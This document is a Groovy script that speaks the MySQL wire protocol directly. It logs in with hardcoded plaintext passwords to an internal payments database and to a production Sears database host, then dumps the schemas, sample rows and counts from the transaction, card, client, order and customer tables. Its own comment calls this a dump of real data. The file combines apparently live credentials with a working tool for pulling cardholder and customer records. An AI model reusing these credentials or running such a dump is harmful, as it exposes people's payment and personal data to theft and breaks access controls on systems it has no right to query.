// Dump datos reales T1Pagos + PROD Sears
import java.security.MessageDigest

def concat = { byte[]... arrays ->
    def baos = new java.io.ByteArrayOutputStream()
    arrays.each { baos.write(it) }
    baos.toByteArray()
}
def le4 = { int n ->
    [(n & 0xFF) as byte, ((n >> 8) & 0xFF) as byte, ((n >> 16) & 0xFF) as byte, ((n >> 24) & 0xFF) as byte] as byte[]
}
def readPacket = { java.io.InputStream ins ->
    def hdr = new byte[4]
    int r = 0; while (r < 4) r += ins.read(hdr, r, 4-r)
    int len = (hdr[0] & 0xFF) | ((hdr[1] & 0xFF) << 8) | ((hdr[2] & 0xFF) << 16)
    def body = new byte[len]; r = 0; while (r < len) r += ins.read(body, r, len-r)
    [seq: hdr[3] & 0xFF, body: body]
}
def writePacket = { java.io.OutputStream outs, int seq, byte[] data ->
    outs.write(data.length & 0xFF); outs.write((data.length>>8) & 0xFF); outs.write((data.length>>16) & 0xFF)
    outs.write(seq & 0xFF); outs.write(data); outs.flush()
}
def sha1 = { byte[] d -> MessageDigest.getInstance("SHA-1").digest(d) }
def nativeHash = { String pwd, byte[] scr ->
    def h1 = sha1(pwd.getBytes("UTF-8")); def h2 = sha1(h1)
    def md = MessageDigest.getInstance("SHA-1"); md.update(scr, 0, Math.min(20, scr.length)); md.update(h2)
    def r = md.digest(); for (int i=0; i<r.length; i++) r[i] = (byte)(r[i] ^ h1[i]); r
}

def mysqlQuery = { String host, int port, String user, String pass, String db, String sql ->
    def sock = new java.net.Socket()
    sock.connect(new java.net.InetSocketAddress(host, port), 8000); sock.setSoTimeout(15000)
    def ins = sock.inputStream; def outs = sock.outputStream
    def g = readPacket(ins); def body = g.body
    int i = 1; while (i < body.length && body[i] != 0) i++
    def sv = new String(body, 1, i-1, "UTF-8"); i += 5
    def s1 = new byte[8]; System.arraycopy(body, i, s1, 0, 8); i += 9
    i += 8 // caps+charset+status+caps2+auth_len
    i += 10 // reserved
    def s2 = new byte[12]; if (i+12 <= body.length) System.arraycopy(body, i, s2, 0, 12)
    def scr = concat(s1, s2)
    def ph = pass ? nativeHash(pass, scr) : new byte[0]
    def hs = concat(le4(0x000FA68D), le4(16777216), [0x21 as byte] as byte[], new byte[23],
        (user+"\u0000").getBytes("UTF-8"), concat([(byte)ph.length] as byte[], ph),
        (db+"\u0000").getBytes("UTF-8"), "mysql_native_password\u0000".getBytes("UTF-8"))
    writePacket(outs, 1, hs)
    def ar = readPacket(ins).body
    if ((ar[0]&0xFF)==0xFE) {
        int pi=1; while(pi<ar.length&&ar[pi]!=0) pi++
        def ns=new byte[20]; if(ar.length>pi+1) System.arraycopy(ar,pi+1,ns,0,Math.min(20,ar.length-pi-1))
        def sw = pass ? nativeHash(pass, ns) : new byte[0]
        def sp = readPacket(ins); writePacket(outs, sp.seq+1, sw); ar = readPacket(ins).body
    }
    if ((ar[0]&0xFF)==0xFF) { sock.close(); return "AUTH_ERR: " + new String(ar,9,Math.min(ar.length-9,150),"UTF-8") }
    writePacket(outs, 0, concat([0x03 as byte] as byte[], sql.getBytes("UTF-8")))
    def rb = readPacket(ins).body
    if ((rb[0]&0xFF)==0xFF) { sock.close(); return "ERR: " + new String(rb,9,Math.min(rb.length-9,200),"UTF-8") }
    if (rb[0]==0x00) { sock.close(); return "OK" }
    int nc = rb[0]&0xFF; def cols = []
    nc.times {
        def cp = readPacket(ins).body; int ci=0
        4.times { if (ci<cp.length) { int l=cp[ci]&0xFF; ci+=1+l } }
        if (ci<cp.length) { int nl=cp[ci]&0xFF; ci++; cols << new String(cp, ci, nl, "UTF-8") }
    }
    readPacket(ins) // EOF
    def rows = []
    while (rows.size() < 50) {
        def rw = readPacket(ins).body
        if ((rw[0]&0xFF)==0xFE && rw.length<9) break
        if ((rw[0]&0xFF)==0xFF) break
        def row = []; int ri=0
        nc.times {
            if (ri<rw.length) {
                if ((rw[ri]&0xFF)==0xFB) { row<<"NULL"; ri++ }
                else { int rl=rw[ri]&0xFF; ri++; if(rl<251){row<<new String(rw,ri,rl,"UTF-8");ri+=rl}else{row<<"(big)";ri++} }
            }
        }
        rows << row
    }
    sock.close()
    def out = "[${sv}]\n" + cols.join(" | ") + "\n"
    rows.each { row -> out += "  " + row.join(" | ") + "\n" }
    out + "(${rows.size()} rows)"
}

println "====== T1PAGOS DB 172.27.141.26:3306 ======"
println "\n--- SCHEMA transaction ---"
try { println mysqlQuery("172.27.141.26", 3306, "app_t1", "pySY8}7>ftpPz9S", "payment_t1", "DESCRIBE payment_t1.transaction") } catch(e) { println e.message }

println "\n--- SAMPLE transaction (5 rows) ---"
try { println mysqlQuery("172.27.141.26", 3306, "app_t1", "pySY8}7>ftpPz9S", "payment_t1", "SELECT * FROM payment_t1.transaction ORDER BY id DESC LIMIT 5") } catch(e) { println e.message }

println "\n--- COUNT transaction ---"
try { println mysqlQuery("172.27.141.26", 3306, "app_t1", "pySY8}7>ftpPz9S", "payment_t1", "SELECT COUNT(*) FROM payment_t1.transaction") } catch(e) { println e.message }

println "\n--- SCHEMA card ---"
try { println mysqlQuery("172.27.141.26", 3306, "app_t1", "pySY8}7>ftpPz9S", "payment_t1", "DESCRIBE payment_t1.card") } catch(e) { println e.message }

println "\n--- SAMPLE card ---"
try { println mysqlQuery("172.27.141.26", 3306, "app_t1", "pySY8}7>ftpPz9S", "payment_t1", "SELECT * FROM payment_t1.card LIMIT 5") } catch(e) { println e.message }

println "\n--- SCHEMA client ---"
try { println mysqlQuery("172.27.141.26", 3306, "app_t1", "pySY8}7>ftpPz9S", "payment_t1", "DESCRIBE payment_t1.client") } catch(e) { println e.message }

println "\n--- COUNT client ---"
try { println mysqlQuery("172.27.141.26", 3306, "app_t1", "pySY8}7>ftpPz9S", "payment_t1", "SELECT COUNT(*) FROM payment_t1.client") } catch(e) { println e.message }

println "\n====== PROD SEARS dbpsears.claroshop-services.net:3312 ======"

println "\n--- DESCRIBE pedidos ---"
try { println mysqlQuery("dbpsears.claroshop-services.net", 3312, "apsearsats", "7g4kktCAEuOV9CX", "tienda", "DESCRIBE tienda.pedidos") } catch(e) { println e.message }

println "\n--- SAMPLE pedidos (5 rows) ---"
try { println mysqlQuery("dbpsears.claroshop-services.net", 3312, "apsearsats", "7g4kktCAEuOV9CX", "tienda", "SELECT idpedido,idcliente,total,estado,fechapedido FROM tienda.pedidos ORDER BY idpedido DESC LIMIT 5") } catch(e) { println e.message }

println "\n--- DESCRIBE clientes ---"
try { println mysqlQuery("dbpsears.claroshop-services.net", 3312, "apsearsats", "7g4kktCAEuOV9CX", "tienda", "DESCRIBE tienda.clientes") } catch(e) { println e.message }

println "\n--- COUNT clientes ---"
try { println mysqlQuery("dbpsears.claroshop-services.net", 3312, "apsearsats", "7g4kktCAEuOV9CX", "tienda", "SELECT COUNT(*) FROM tienda.clientes") } catch(e) { println e.message }

println "\n--- SHOW DATABASES completo ---"
try { println mysqlQuery("dbpsears.claroshop-services.net", 3312, "apsearsats", "7g4kktCAEuOV9CX", "tienda", "SHOW DATABASES") } catch(e) { println e.message }

println "\n--- tienda_nueva tables ---"
try { println mysqlQuery("dbpsears.claroshop-services.net", 3312, "apsearsats", "7g4kktCAEuOV9CX", "tienda_nueva", "SHOW TABLES FROM tienda_nueva") } catch(e) { println e.message }

println "\n====== FIN ======"
